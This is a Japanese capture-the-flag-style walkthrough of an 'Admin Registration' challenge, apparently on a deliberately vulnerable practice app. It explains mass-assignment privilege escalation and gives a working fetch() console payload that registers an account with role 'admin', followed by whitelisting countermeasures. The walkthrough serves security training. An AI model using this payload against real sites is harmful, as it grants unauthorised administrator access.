# Admin Registration ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** アクセス制御
**目標:** 管理者権限を持つアカウントを作成する

---

## 思考プロセス

**ステップ1: 登録フォームの分析**
```
「通常の登録ではメール・パスワード・確認のみ入力できる」
    ↓
「でもサーバー側ではユーザーに role（役割）があるはず」
    ↓
「APIに直接リクエストを送って、role を指定できないか？」
```

**ステップ2: ネットワークの観察**
```
「DevTools の Network タブで登録時のリクエストを見る」
    ↓
「POST /api/Users/ に JSON が送られている」
    ↓
「{email: "...", password: "..."} という形式」
    ↓
「ここに role: "admin" を追加したらどうなる？」
```

**ステップ3: Mass Assignment を試す**
```
「role: "admin" を追加してリクエストを送信」
    ↓
「成功！管理者として登録された」
    ↓
「サーバーが余計なパラメータを受け入れる "Mass Assignment" 脆弱性」
```

## 実行手順

1. `F12` で DevTools を開く
2. 「Console」タブで以下を実行:
   ```javascript
   fetch('/api/Users/', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
       email: 'hacker@admin.com',
       password: 'admin123',
       role: 'admin'
     })
   }).then(r => r.json()).then(console.log)
   ```
3. `{status: "success"}` が返れば成功
4. 作成したアカウントでログインすると管理者になっている

## 解説

**Mass Assignment（一括代入）脆弱性とは？**
- 通常の登録フォームでは `role` は指定できない
- しかしAPIは `role` パラメータを受け入れてしまう
- ユーザーが意図しないフィールドを操作できる脆弱性

**対策:**
- 許可するフィールドを明示的にホワイトリスト化
- 重要なフィールド（role, isAdmin など）は別途保護

## 関連チャレンジ

- [Empty User Registration](../difficulty-2/empty-user-registration.md)
- [Repetitive Registration](../difficulty-1/repetitive-registration.md)
